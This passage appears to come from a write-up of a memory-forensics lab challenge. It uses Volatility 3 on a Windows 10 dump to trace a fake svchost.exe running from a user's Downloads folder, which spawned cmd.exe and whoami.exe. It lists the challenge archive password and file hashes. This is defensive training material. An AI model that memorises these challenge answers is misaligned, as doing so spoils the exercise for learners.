persisted. the soc manager then directed the immediate containment of the workstation and a memory dump for analysis. as a memory forensics expert, you are tasked with assisting the soc team at forela to investigate and resolve this urgent incident.\nartifacts artifact md5 hash password rogueone.zip 5810aa928e827d5ab8373aa4e1107572 hacktheblue 220230810.mem d34ed786f888c1da061399df6cbe9d7b n/a tools volatility analysis memory dump information\n$ vol3 -f 20230810.mem windows.info volatility 3 framework 2.7.1 progress: 100.00\tpdb scanning finished variable\tvalue kernel base\t0xf80178400000 dtb\t0x16a000 symbols\tfile:///opt/volatility3/volatility3/symbols/windows/ntkrnlmp.pdb/3789767e34b7a48a3fc80ce12de18e65-1.json.xz is64bit\ttrue ispae\tfalse layer_name\t0 windowsintel32e memory_layer\t1 filelayer kdversionblock\t0xf8017900f398 major/minor\t15.19041 machinetype\t34404 kenumberprocessors\t8 systemtime\t2023-08-10 11:32:00 ntsystemroot\tc:\\windows ntproducttype\tntproductwinnt ntmajorversion\t10 ntminorversion\t0 pe majoroperatingsystemversion\t10 pe minoroperatingsystemversion\t0 pe machine\t34404 pe timedatestamp\tmon nov 24 23:45:00 2070 profile identification we are dealing with windows 10.0 build 19041 and x64 architecture.\nmalicious process identification\nprocess information\n$ vol3 -f 20230810.mem windows.psscan volatility 3 framework 2.7.1 progress: 100.00\tpdb scanning finished pid\tppid\timagefilename\toffset(v)\tthreads\thandles\tsessionid\twow64\tcreatetime\texittime\tfile output 4876\t788\tsvchost.exe\t0x9d80001bd1c0\t4\t-\t0\tfalse\t2023-08-10 11:13:45.000000 n/a\tdisabled 4\t0\tsystem\t0x9e8b87680040\t225\t-\tn/a\tfalse\t2023-08-10 11:13:38.000000 n/a\tdisabled 140\t4\tregistry\t0x9e8b876ce080\t4\t-\tn/a\tfalse\t2023-08-10 11:13:32.000000 n/a\tdisabled 2240\t928\tshellexperienc\t0x9e8b8775c080\t11\t-\t1\tfalse\t2023-08-10 11:27:30.000000 n/a\tdisabled 6812\t7436\tsvchost.exe\t0x9e8b87762080\t3\t-\t1\tfalse\t2023-08-10 11:30:03.000000 n/a\tdisabled 564\t548\tcsrss.exe\t0x9e8b882f8140\t13\t-\t0\tfalse\t2023-08-10 11:13:41.000000 n/a\tdisabled 436\t4\tsmss.exe\t0x9e8b8843f040\t2\t-\tn/a\tfalse\t2023-08-10 11:13:38.000000 n/a\tdisabled 644\t636\tcsrss.exe\t0x9e8b893eb140\t14\t-\t1\tfalse\t2023-08-10 11:13:41.000000 n/a\tdisabled 656\t548\twininit.exe\t0x9e8b89416080\t1\t-\t0\tfalse\t2023-08-10 11:13:41.000000 n/a\tdisabled 744\t636\twinlogon.exe\t0x9e8b89441080\t4\t-\t1\tfalse\t2023-08-10 11:13:42.000000 n/a\tdisabled 4744\t788\tsvchost.exe\t0x9e8b8946d1c0\t1\t-\t0\tfalse\t2023-08-10 11:13:45.000000 n/a\tdisabled 788\t656\tservices.exe\t0x9e8b8949e080\t10\t-\t0\tfalse\t2023-08-10 11:13:42.000000 n/a\tdisabled 808\t656\tlsass.exe\t0x9e8b894a2080\t12\t-\t0\tfalse\t2023-08-10 11:13:42.000000 n/a\tdisabled 928\t788\tsvchost.exe\t0x9e8b89527240\t13\t-\t0\tfalse\t2023-08-10 11:13:42.000000 n/a\tdisabled 964\t656\tfontdrvhost.ex\t0x9e8b8952e180\t5\t-\t0\tfalse\t2023-08-10 11:13:43.000000 n/a\tdisabled 956\t744\tfontdrvhost.ex\t0x9e8b89530180\t5\t-\t1\tfalse\t2023-08-10 11:13:43.000000 n/a\tdisabled 512\t788\tsvchost.exe\t0x9e8b895a72c0\t11\t-\t0\tfalse\t2023-08-10 11:13:43.000000 n/a\tdisabled 864\t788\tsvchost.exe\t0x9e8b895a9240\t6\t-\t0\tfalse\t2023-08-10 11:13:43.000000 n/a\tdisabled 7756\t928\truntimebroker.\t0x9e8b89c39080\t4\t-\t1\tfalse\t2023-08-10 11:14:16.000000 n/a\tdisabled 1048\t744\tdwm.exe\t0x9e8b89c520c0\t14\t-\t1\tfalse\t2023-08-10 11:13:43.000000 n/a\tdisabled 1148\t788\tsvchost.exe\t0x9e8b89c922c0\t30\t-\t0\tfalse\t2023-08-10 11:13:43.000000 n/a\tdisabled 1272\t788\tsvchost.exe\t0x9e8b89cf4280\t3\t-\t0\tfalse\t2023-08-10 11:13:43.000000 n/a\tdisabled 1280\t788\tsvchost.exe\t0x9e8b89cf5080\t4\t-\t0\tfalse\t2023-08-10 11:13:43.000000 n/a\tdisabled 1288\t788\tsvchost.exe\t0x9e8b89cf71c0\t3\t-\t0\tfalse\t2023-08-10 11:13:43.000000 n/a\tdisabled 1296\t788\tsvchost.exe\t0x9e8b89cf91c0\t4\t-\t0\tfalse\t2023-08-10 11:13:43.000000 n/a\tdisabled 1304\t788\tsvchost.exe\t0x9e8b89cfb200\t4\t-\t0\tfalse\t2023-08-10 11:13:43.000000 n/a\tdisabled 1432\t788\tsvchost.exe\t0x9e8b89d121c0\t5\t-\t0\tfalse\t2023-08-10 11:13:43.000000 n/a\tdisabled 1472\t788\tsvchost.exe\t0x9e8b89d3e1c0\t7\t-\t0\tfalse\t2023-08-10 11:13:43.000000 n/a\tdisabled 1500\t788\tsvchost.exe\t0x9e8b89d412c0\t10\t-\t0\tfalse\t2023-08-10 11:13:43.000000 n/a\tdisabled 1580\t788\tsvchost.exe\t0x9e8b89d900c0\t7\t-\t0\tfalse\t2023-08-10 11:13:43.000000 n/a\tdisabled 8224\t928\tsearchapp.exe\t0x9e8b89d92080\t55\t-\t1\tfalse\t2023-08-10 11:14:14.000000 n/a\tdisabled 1588\t788\tsvchost.exe\t0x9e8b89d94080\t6\t-\t0\tfalse\t2023-08-10 11:13:43.000000 n/a\tdisabled 1712\t788\tsvchost.exe\t0x9e8b89dab1c0\t2\t-\t0\tfalse\t2023-08-10 11:13:43.000000 n/a\tdisabled 5056\t1580\tmicrosoftedgeu\t0x9e8b89e21080\t0\t-\t0\tfalse\t2023-08-10 11:20:44.000000 2023-08-10 11:29:13.000000 disabled 1748\t788\tsvchost.exe\t0x9e8b89e541c0\t11\t-\t0\tfalse\t2023-08-10 11:13:43.000000 n/a\tdisabled 1756\t788\tsvchost.exe\t0x9e8b89e562c0\t6\t-\t0\tfalse\t2023-08-10 11:13:43.000000 n/a\tdisabled 1828\t788\tsvchost.exe\t0x9e8b89e70240\t6\t-\t0\tfalse\t2023-08-10 11:13:43.000000 n/a\tdisabled 9204\t4364\tconhost.exe\t0x9e8b89ec7080\t3\t-\t1\tfalse\t2023-08-10 11:30:57.000000 n/a\tdisabled 2140\t788\tsvchost.exe\t0x9e8b89f6f200\t2\t-\t0\tfalse\t2023-08-10 11:13:44.000000 n/a\tdisabled 1980\t788\tsvchost.exe\t0x9e8b89fbc240\t3\t-\t0\tfalse\t2023-08-10 11:13:43.000000 n/a\tdisabled 1988\t788\tsvchost.exe\t0x9e8b89fc1280\t6\t-\t0\tfalse\t2023-08-10 11:13:43.000000 n/a\tdisabled 2044\t788\tsvchost.exe\t0x9e8b89fc2080\t8\t-\t0\tfalse\t2023-08-10 11:13:43.000000 n/a\tdisabled 1996\t788\tsvchost.exe\t0x9e8b89fc4080\t6\t-\t0\tfalse\t2023-08-10 11:13:43.000000 n/a\tdisabled 2184\t4\tmemcompression\t0x9e8b8a038040\t22\t-\tn/a\tfalse\t2023-08-10 11:13:44.000000 n/a\tdisabled 2168\t788\tsvchost.exe\t0x9e8b8a039240\t2\t-\t0\tfalse\t2023-08-10 11:13:44.000000 n/a\tdisabled 6344\t788\tsvchost.exe\t0x9e8b8a04f340\t4\t-\t0\tfalse\t2023-08-10 11:26:32.000000 n/a\tdisabled 2256\t788\tsvchost.exe\t0x9e8b8a09c240\t21\t-\t0\tfalse\t2023-08-10 11:13:44.000000 n/a\tdisabled 2356\t788\tsvchost.exe\t0x9e8b8a106280\t2\t-\t0\tfalse\t2023-08-10 11:13:44.000000 n/a\tdisabled 2368\t788\tsvchost.exe\t0x9e8b8a108280\t2\t-\t0\tfalse\t2023-08-10 11:13:44.000000 n/a\tdisabled 2476\t788\tsvchost.exe\t0x9e8b8a131240\t5\t-\t0\tfalse\t2023-08-10 11:13:44.000000 n/a\tdisabled 2588\t788\tsvchost.exe\t0x9e8b8a18c240\t4\t-\t0\tfalse\t2023-08-10 11:13:44.000000 n/a\tdisabled 2704\t788\tsvchost.exe\t0x9e8b8a2581c0\t1\t-\t0\tfalse\t2023-08-10 11:13:44.000000 n/a\tdisabled 2740\t788\tsvchost.exe\t0x9e8b8a25b080\t11\t-\t0\tfalse\t2023-08-10 11:13:44.000000 n/a\tdisabled 2816\t788\tsvchost.exe\t0x9e8b8a2ed300\t5\t-\t0\tfalse\t2023-08-10 11:13:44.000000 n/a\tdisabled 2936\t788\tsvchost.exe\t0x9e8b8a327240\t5\t-\t0\tfalse\t2023-08-10 11:13:44.000000 n/a\tdisabled 2948\t788\tsvchost.exe\t0x9e8b8a33b1c0\t3\t-\t0\tfalse\t2023-08-10 11:13:44.000000 n/a\tdisabled 2956\t788\tsvchost.exe\t0x9e8b8a33d1c0\t4\t-\t0\tfalse\t2023-08-10 11:13:44.000000 n/a\tdisabled 6224\t788\tsvchost.exe\t0x9e8b8a33e080\t4\t-\t0\tfalse\t2023-08-10 11:28:46.000000 n/a\tdisabled 2644\t788\tsvchost.exe\t0x9e8b8a3ea240\t2\t-\t0\tfalse\t2023-08-10 11:13:44.000000 n/a\tdisabled 3108\t788\tsvchost.exe\t0x9e8b8a42f240\t3\t-\t0\tfalse\t2023-08-10 11:13:44.000000 n/a\tdisabled 3204\t788\tspoolsv.exe\t0x9e8b8a43f200\t7\t-\t0\tfalse\t2023-08-10 11:13:44.000000 n/a\tdisabled 3316\t788\tsvchost.exe\t0x9e8b8a510240\t10\t-\t0\tfalse\t2023-08-10 11:13:44.000000 n/a\tdisabled 3464\t788\tvm3dservice.ex\t0x9e8b8a52d080\t2\t-\t0\tfalse\t2023-08-10 11:13:44.000000 n/a\tdisabled 3404\t788\tsvchost.exe\t0x9e8b8a562080\t7\t-\t0\tfalse\t2023-08-10 11:13:44.000000 n/a\tdisabled 3368\t788\tsvchost.exe\t0x9e8b8a5631c0\t16\t-\t0\tfalse\t2023-08-10 11:13:44.000000 n/a\tdisabled 3324\t788\tsvchost.exe\t0x9e8b8a5652c0\t7\t-\t0\tfalse\t2023-08-10 11:13:44.000000 n/a\tdisabled 3352\t788\tsvchost.exe\t0x9e8b8a574080\t1\t-\t0\tfalse\t2023-08-10 11:13:44.000000 n/a\tdisabled 3376\t788\tsvchost.exe\t0x9e8b8a575080\t3\t-\t0\tfalse\t2023-08-10 11:13:44.000000 n/a\tdisabled 3424\t788\tsysmon64.exe\t0x9e8b8a578200\t13\t-\t0\tfalse\t2023-08-10 11:13:44.000000 n/a\tdisabled 3416\t788\tvmtoolsd.exe\t0x9e8b8a57a280\t11\t-\t0\tfalse\t2023-08-10 11:13:44.000000 n/a\tdisabled 3444\t788\tvgauthservice.\t0x9e8b8a57c300\t2\t-\t0\tfalse\t2023-08-10 11:13:44.000000 n/a\tdisabled 3680\t788\tsvchost.exe\t0x9e8b8a60c2c0\t3\t-\t0\tfalse\t2023-08-10 11:13:44.000000 n/a\tdisabled 3756\t788\tsvchost.exe\t0x9e8b8a6a4240\t6\t-\t0\tfalse\t2023-08-10 11:13:44.000000 n/a\tdisabled 3788\t3464\tvm3dservice.ex\t0x9e8b8a71f200\t2\t-\t1\tfalse\t2023-08-10 11:13:44.000000 n/a\tdisabled 1616\t1576\tmsedgewebview2\t0x9e8b8a74f080\t22\t-\t1\tfalse\t2023-08-10 11:20:25.000000 n/a\tdisabled 3816\t788\tsvchost.exe\t0x9e8b8a761240\t11\t-\t0\tfalse\t2023-08-10 11:13:44.000000 n/a\tdisabled 4132\t928\tunsecapp.exe\t0x9e8b8a9b00c0\t3\t-\t0\tfalse\t2023-08-10 11:13:45.000000 n/a\tdisabled 4912\t788\tmsdtc.exe\t0x9e8b8a9b3300\t9\t-\t0\tfalse\t2023-08-10 11:13:45.000000 n/a\tdisabled 2776\t7436\tramcapture64.e\t0x9e8b8aa66080\t5\t-\t1\tfalse\t2023-08-10 11:31:52.000000 n/a\tdisabled 1552\t1576\tmsedgewebview2\t0x9e8b8aa85080\t8\t-\t1\tfalse\t2023-08-10 11:20:25.000000 n/a\tdisabled 4416\t928\twmiprvse.exe\t0x9e8b8aac5280\t15\t-\t0\tfalse\t2023-08-10 11:13:45.000000 n/a\tdisabled 4440\t788\tdllhost.exe\t0x9e8b8aac8080\t10\t-\t0\tfalse\t2023-08-10 11:13:45.000000 n/a\tdisabled 4876\t788\tsvchost.exe\t0x9e8b8aedb1c0\t4\t-\t0\tfalse\t2023-08-10 11:13:45.000000 n/a\tdisabled 8260\t936\tcmd.exe\t0x9e8b8afda300\t2\t-\t1\tfalse\t2023-08-10 11:27:15.000000 n/a\tdisabled 6084\t1576\tmsedgewebview2\t0x9e8b8b0f1080\t19\t-\t1\tfalse\t2023-08-10 11:20:25.000000 n/a\tdisabled 4308\t788\tsvchost.exe\t0x9e8b8b19a1c0\t6\t-\t0\tfalse\t2023-08-10 11:13:46.000000 n/a\tdisabled 4160\t788\tsvchost.exe\t0x9e8b8b1ef280\t2\t-\t0\tfalse\t2023-08-10 11:13:46.000000 n/a\tdisabled 1792\t788\tsvchost.exe\t0x9e8b8b2561c0\t5\t-\t0\tfalse\t2023-08-10 11:13:46.000000 n/a\tdisabled 5292\t928\twmiprvse.exe\t0x9e8b8b30a280\t4\t-\t0\tfalse\t2023-08-10 11:13:47.000000 n/a\tdisabled 6136\t788\tsvchost.exe\t0x9e8b8b34a080\t11\t-\t0\tfalse\t2023-08-10 11:13:53.000000 n/a\tdisabled 5452\t788\tsvchost.exe\t0x9e8b8b34b240\t28\t-\t0\tfalse\t2023-08-10 11:13:51.000000 n/a\tdisabled 5796\t788\tsvchost.exe\t0x9e8b8b4b61c0\t5\t-\t0\tfalse\t2023-08-10 11:13:51.000000 n/a\tdisabled 5972\t788\tsvchost.exe\t0x9e8b8b4cb240\t18\t-\t0\tfalse\t2023-08-10 11:13:52.000000 n/a\tdisabled 1576\t5864\tmsedgewebview2\t0x9e8b8b4cc080\t47\t-\t1\tfalse\t2023-08-10 11:20:21.000000 n/a\tdisabled 7128\t928\tmousocoreworke\t0x9e8b8b526280\t10\t-\t0\tfalse\t2023-08-10 11:14:06.000000 n/a\tdisabled 7008\t788\tsvchost.exe\t0x9e8b8b5ea080\t6\t-\t0\tfalse\t2023-08-10 11:14:05.000000 n/a\tdisabled 7072\t788\tsvchost.exe\t0x9e8b8b5f0240\t9\t-\t0\tfalse\t2023-08-10 11:14:06.000000 n/a\tdisabled 4364\t6812\tcmd.exe\t0x9e8b8b6ef080\t1\t-\t1\tfalse\t2023-08-10 11:30:57.000000 n/a\tdisabled 8428\t8680\tsearchprotocol\t0x9e8b8b742080\t7\t-\t0\tfalse\t2023-08-10 11:29:25.000000 n/a\tdisabled 5628\t788\tsvchost.exe\t0x9e8b8b77e080\t4\t-\t0\tfalse\t2023-08-10 11:13:53.000000 n/a\tdisabled 4272\t1828\tsihost.exe\t0x9e8b8b872280\t8\t-\t1\tfalse\t2023-08-10 11:14:07.000000 n/a\tdisabled 2284\t1576\tmsedgewebview2\t0x9e8b8b8dc080\t14\t-\t1\tfalse\t2023-08-10 11:20:25.000000 n/a\tdisabled 4992\t788\tsvchost.exe\t0x9e8b8b9bd300\t11\t-\t1\tfalse\t2023-08-10 11:14:07.000000 n/a\tdisabled 4372\t788\tsvchost.exe\t0x9e8b8b9ce300\t5\t-\t1\tfalse\t2023-08-10 11:14:07.000000 n/a\tdisabled 9088\t788\tsvchost.exe\t0x9e8b8c4020c0\t2\t-\t0\tfalse\t2023-08-10 11:26:32.000000 n/a\tdisabled 6692\t788\tsvchost.exe\t0x9e8b8c42c280\t3\t-\t0\tfalse\t2023-08-10 11:14:07.000000 n/a\tdisabled 6768\t6692\tctfmon.exe\t0x9e8b8c452280\t12\t-\t1\tfalse\t2023-08-10 11:14:07.000000 n/a\tdisabled 6324\t1580\ttaskhostw.exe\t0x9e8b8c45a300\t8\t-\t1\tfalse\t2023-08-10 11:14:07.000000 n/a\tdisabled 7436\t7400\texplorer.exe\t0x9e8b8c4d2080\t75\t-\t1\tfalse\t2023-08-10 11:14:07.000000 n/a\tdisabled 7400\t744\tuserinit.exe\t0x9e8b8c608340\t0\t-\t1\tfalse\t2023-08-10 11:14:07.000000 2023-08-10 11:14:34.000000 disabled 7236\t788\tsvchost.exe\t0x9e8b8c6b2080\t7\t-\t1\tfalse\t2023-08-10 11:14:11.000000 n/a\tdisabled 8560\t788\tsvchost.exe\t0x9e8b8c7430c0\t7\t-\t0\tfalse\t2023-08-10 11:24:26.000000 n/a\tdisabled 4112\t1580\tgoogleupdate.e\t0x9e8b8c74c080\t3\t-\t0\ttrue\t2023-08-10 11:20:19.000000 n/a\tdisabled 9612\t788\tsecurityhealth\t0x9e8b8c7d6080\t11\t-\t0\tfalse\t2023-08-10 11:14:25.000000 n/a\tdisabled 5196\t788\tsvchost.exe\t0x9e8b8ca65300\t3\t-\t0\tfalse\t2023-08-10 11:27:43.000000 n/a\tdisabled 8488\t928\truntimebroker.\t0x9e8b8caa5080\t8\t-\t1\tfalse\t2023-08-10 11:14:14.000000 n/a\tdisabled 3616\t928\truntimebroker.\t0x9e8b8cb62080\t6\t-\t1\tfalse\t2023-08-10 11:27:38.000000 n/a\tdisabled 9712\t7436\tvmtoolsd.exe\t0x9e8b8cbd5080\t9\t-\t1\tfalse\t2023-08-10 11:14:26.000000 n/a\tdisabled 8116\t788\tsvchost.exe\t0x9e8b8cc6e240\t10\t-\t0\tfalse\t2023-08-10 11:14:11.000000 n/a\tdisabled 936\t7436\tsvchost.exe\t0x9e8b8cd89080\t0\t-\t1\tfalse\t2023-08-10 11:22:31.000000 2023-08-10 11:27:51.000000 disabled 7704\t928\tstartmenuexper\t0x9e8b8cd9e080\t8\t-\t1\tfalse\t2023-08-10 11:14:13.000000 n/a\tdisabled 652\t788\tsvchost.exe\t0x9e8b8cee2080\t5\t-\t0\tfalse\t2023-08-10 11:14:13.000000 n/a\tdisabled 7904\t788\tsvchost.exe\t0x9e8b8cf91080\t3\t-\t0\tfalse\t2023-08-10 11:27:43.000000 n/a\tdisabled 4380\t928\truntimebroker.\t0x9e8b8cf95080\t3\t-\t1\tfalse\t2023-08-10 11:14:13.000000 n/a\tdisabled 2728\t1576\tmsedgewebview2\t0x9e8b8cf97080\t7\t-\t1\tfalse\t2023-08-10 11:20:21.000000 n/a\tdisabled 8828\t928\tsmartscreen.ex\t0x9e8b8cff5300\t8\t-\t1\tfalse\t2023-08-10 11:14:15.000000 n/a\tdisabled 8680\t788\tsearchindexer.\t0x9e8b9010c240\t15\t-\t0\tfalse\t2023-08-10 11:14:15.000000 n/a\tdisabled 9580\t7436\tsecurityhealth\t0x9e8b90135340\t1\t-\t1\tfalse\t2023-08-10 11:14:25.000000 n/a\tdisabled 10044\t9952\tonedrive.exe\t0x9e8b90507080\t0\t-\t1\ttrue\t2023-08-10 11:15:31.000000 2023-08-10 11:15:37.000000 disabled 9976\t788\tsvchost.exe\t0x9e8b90509080\t0\t-\t0\tfalse\t2023-08-10 11:27:43.000000 2023-08-10 11:31:46.000000 disabled 3024\t928\ttextinputhost.\t0x9e8b9050d080\t9\t-\t1\tfalse\t2023-08-10 11:17:11.000000 n/a\tdisabled 4200\t788\tsvchost.exe\t0x9e8b90554240\t0\t-\t0\tfalse\t2023-08-10 11:14:19.000000 2023-08-10 11:16:20.000000 disabled 6680\t4364\twhoami.exe\t0x9e8b905f1080\t0\t-\t1\tfalse\t2023-08-10 11:31:01.000000 2023-08-10 11:31:01.000000 disabled 4664\t928\tdllhost.exe\t0x9e8b907ef080\t8\t-\t1\tfalse\t2023-08-10 11:14:21.000000 n/a\tdisabled 1908\t2740\taudiodg.exe\t0x9e8b90ec9080\t5\t-\t0\tfalse\t2023-08-10 11:27:38.000000 n/a\tdisabled 6620\t928\tsecurityhealth\t0x9e8b911e2080\t0\t-\t1\tfalse\t2023-08-10 11:28:47.000000 2023-08-10 11:29:52.000000 disabled 9724\t788\tsvchost.exe\t0x9e8b911e3080\t4\t-\t0\tfalse\t2023-08-10 11:28:20.000000 n/a\tdisabled 10176\t788\tsgrmbroker.exe\t0x9e8b911e5080\t7\t-\t0\tfalse\t2023-08-10 11:15:45.000000 n/a\tdisabled 3136\t788\tmsmpeng.exe\t0x9e8b914f0300\t10\t-\t0\tfalse\t2023-08-10 11:24:47.000000 n/a\tdisabled 9816\t2776\tconhost.exe\t0x9e8b91cda080\t6\t-\t1\tfalse\t2023-08-10 11:31:52.000000 n/a\tdisabled 6000\t788\tsvchost.exe\t0x9e8b926e7300\t2\t-\t0\tfalse\t2023-08-10 11:27:43.000000 n/a\tdisabled 1244\t788\tsvchost.exe\t0x9e8b92987300\t5\t-\t0\tfalse\t2023-08-10 11:26:35.000000 n/a\tdisabled 5864\t7436\twinrar.exe\t0x9e8b92bdb0c0\t5\t-\t1\tfalse\t2023-08-10 11:20:21.000000 n/a\tdisabled 1564\t788\tsvchost.exe\t0x9e8b92bdf080\t1\t-\t0\tfalse\t2023-08-10 11:14:54.000000 n/a\tdisabled 1668\t8260\tconhost.exe\t0x9e8b92c65300\t3\t-\t1\tfalse\t2023-08-10 11:27:15.000000 n/a\tdisabled 7416\t788\tsvchost.exe\t0x9e8b92ddd340\t1\t-\t1\tfalse\t2023-08-10 11:15:45.000000 n/a\tdisabled 10072\t788\tsvchost.exe\t0x9e8b92f1c340\t9\t-\t0\tfalse\t2023-08-10 11:15:45.000000 n/a\tdisabled 9784\t8680\tsearchfilterho\t0x9e8b92fda080\t4\t-\t0\tfalse\t2023-08-10 11:31:32.000000 n/a\tdisabled 1396\t788\tuhssvc.exe\t0x9e8b930402c0\t3\t-\t0\tfalse\t2023-08-10 11:15:45.000000 n/a\tdisabled 5232\t928\tapplicationfra\t0x9e8b9a26d080\t3\t-\t1\tfalse\t2023-08-10 11:27:42.000000 n/a\tdisabled 3108\t788\tsvchost.exe\t0xb58d4b50f240\t3\t-\t0\tfalse\t2023-08-10 11:13:44.000000 n/a\tdisabled we see a process invoked the whoami.exe process. the pid is 6680 and ppid is 4364. let\u0026rsquo;s do a process tree on this ppid.\nprocess tree on pid 4364.\n$ vol3 -f 20230810.mem windows.pstree --pid 4364 volatility 3 framework 2.7.1 progress: 100.00\tpdb scanning finished pid\tppid\timagefilename\toffset(v)\tthreads\thandles\tsessionid\twow64\tcreatetime\texittime\taudit\tcmd\tpath 744\t636\twinlogon.exe\t0x9e8b89441080\t4\t-\t1\tfalse\t2023-08-10 11:13:42.000000 n/a\t\\device\\harddiskvolume3\\windows\\system32\\winlogon.exe\twinlogon.exe\tc:\\windows\\system32\\winlogon.exe * 7400\t744\tuserinit.exe\t0x9e8b8c608340\t0\t-\t1\tfalse\t2023-08-10 11:14:07.000000 2023-08-10 11:14:34.000000 \\device\\harddiskvolume3\\windows\\system32\\userinit.exe\t-\t- ** 7436\t7400\texplorer.exe\t0x9e8b8c4d2080\t75\t-\t1\tfalse\t2023-08-10 11:14:07.000000 n/a\t\\device\\harddiskvolume3\\windows\\explorer.exe\tc:\\windows\\explorer.exe\tc:\\windows\\explorer.exe *** 6812\t7436\tsvchost.exe\t0x9e8b87762080\t3\t-\t1\tfalse\t2023-08-10 11:30:03.000000 n/a\t\\device\\harddiskvolume3\\users\\simon.stark\\downloads\\svchost.exe\t\u0026#34;c:\\users\\simon.stark\\downloads\\svchost.exe\u0026#34; c:\\users\\simon.stark\\downloads\\svchost.exe **** 4364\t6812\tcmd.exe\t0x9e8b8b6ef080\t1\t-\t1\tfalse\t2023-08-10 11:30:57.000000 n/a\t\\device\\harddiskvolume3\\windows\\system32\\cmd.exe\tc:\\windows\\system32\\cmd.exe\tc:\\windows\\system32\\cmd.exe ***** 9204\t4364\tconhost.exe\t0x9e8b89ec7080\t3\t-\t1\tfalse\t2023-08-10 11:30:57.000000 n/a\t\\device\\harddiskvolume3\\windows\\system32\\conhost.exe\t\\??\\c:\\windows\\system32\\conhost.exe 0x4\tc:\\windows\\system32\\conhost.exe we found the process\u0026rsquo;s name that spawned whoami.exe. it was cmd.exe, and it was spawned from another process named svchost.exe which at a first glance looks like a legit windows process (mainly used to load windows services). but the file resides in c:\\windows\\system32 folder, which is a trusted and protected folder. but in this case, it was loaded from c:\\users\\simon.stark\\downloads\\svchost.exe. which looks malicious and suspicious. please skip to step 2 to where i dump the malicious file.\nsearch for the malicious files (alternative way):\nstep 1: search for open handles inside the malicious process $ vol3 -f 20230810.mem windows.handles --pid 6812 volatility 3 framework 2.7.1 progress: 100.00\tpdb scanning finished pid\tprocess\toffset\thandlevalue\ttype\tgrantedaccess\tname 6812\tsvchost.exe\t0x9e8b8b8084e0\t0x4\tevent\t0x1f0003\t6812\tsvchost.exe\t0x9e8b96564d70\t0xc\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b8b808fe0\t0x10\tevent\t0x1f0003\t6812\tsvchost.exe\t0x9e8b9619d890\t0x14\tíà¿²íà¿²ì¨à¿²ÔÓà¡à¿²á´Ò§à¡à¿²âÑ¿à¡à¿²ì©à¿²\t0x1\t6812\tsvchost.exe\t0x9e8b96564140\t0x18\tiocompletion\t0x1f0003\t6812\tsvchost.exe\t0x9e8b8c406510\t0x1c\ttpworkerfactory\t0xf00ff\t6812\tsvchost.exe\t0x9e8b8cdda2f0\t0x20\tirtimer\t0x100002\t6812\tsvchost.exe\t0x9e8b9619ef50\t0x24\tíà¿²íà¿²ì¨à¿²ÔÓà¡à¿²á´Ò§à¡à¿²âÑ¿à¡à¿²ì©à¿²\t0x1\t6812\tsvchost.exe\t0x9e8b8cddb940\t0x28\tirtimer\t0x100002\t6812\tsvchost.exe\t0x9e8b961a0a20\t0x2c\tíà¿²íà¿²ì¨à¿²ÔÓà¡à¿²á´Ò§à¡à¿²âÑ¿à¡à¿²ì©à¿²\t0x1\t6812\tsvchost.exe\t0x9e8b96564210\t0x30\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b96563b10\t0x34\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b965642f0\t0x38\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b8b808860\t0x3c\tevent\t0x1f0003\t6812\tsvchost.exe\t0x9e8b8b8085e0\t0x40\tevent\t0x1f0003\t6812\tsvchost.exe\t0xb58d4a3b02a0\t0x44\tdirectory\t0x3\tknowndlls 6812\tsvchost.exe\t0x9e8b90911280\t0x48\tfile\t0x100020\t\\device\\harddiskvolume3\\users\\simon.stark\\downloads 6812\tsvchost.exe\t0x9e8b96563410\t0x4c\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b91697b50\t0x50\tmutant\t0x1f0001\tsm0:6812:304:wilstaging_02 6812\tsvchost.exe\t0x9e8b89f7d070\t0x54\talpc port\t0x1f0001\t6812\tsvchost.exe\t0xb58d4a969480\t0x58\tdirectory\t0xf\tbasenamedobjects 6812\tsvchost.exe\t0x9e8b8b66ee50\t0x5c\tsemaphore\t0x1f0003\tsm0:6812:304:wilstaging_02_p0 6812\tsvchost.exe\t0x9e8b8b66f5d0\t0x60\tsemaphore\t0x1f0003\tsm0:6812:304:wilstaging_02_p0h 6812\tsvchost.exe\t0x9e8b96563790\t0x64\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b965643d0\t0x68\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b965644b0\t0x6c\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b965649f0\t0x70\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b96563940\t0x74\tiocompletion\t0x1f0003\t6812\tsvchost.exe\t0x9e8b8b5ef510\t0x78\ttpworkerfactory\t0xf00ff\t6812\tsvchost.exe\t0x9e8b8cdda730\t0x7c\tirtimer\t0x100002\t6812\tsvchost.exe\t0x9e8b9619d480\t0x80\tíà¿²íà¿²ì¨à¿²ÔÓà¡à¿²á´Ò§à¡à¿²âÑ¿à¡à¿²ì©à¿²\t0x1\t6812\tsvchost.exe\t0x9e8b89d05a10\t0x84\tirtimer\t0x100002\t6812\tsvchost.exe\t0x9e8b961a0e30\t0x88\tíà¿²íà¿²ì¨à¿²ÔÓà¡à¿²á´Ò§à¡à¿²âÑ¿à¡à¿²ì©à¿²\t0x1\t6812\tsvchost.exe\t0x9e8b96564830\t0x8c\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b96564bb0\t0x90\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b8b82b080\t0x98\tthread\t0x1fffff\ttid 2032 pid 6812 6812\tsvchost.exe\t0x9e8b8b806f60\t0x9c\tevent\t0x1f0003\t6812\tsvchost.exe\t0x9e8b8b809060\t0xa4\tevent\t0x1f0003\t6812\tsvchost.exe\t0x9e8b96564590\t0xac\tetwregistration\t0x804\t6812\tsvchost.exe\t0x9e8b8b8090e0\t0xb0\tevent\t0x1f0003\t6812\tsvchost.exe\t0x9e8b90903e00\t0xb4\tfile\t0x16019f\t\\device\\afd\\endpoint 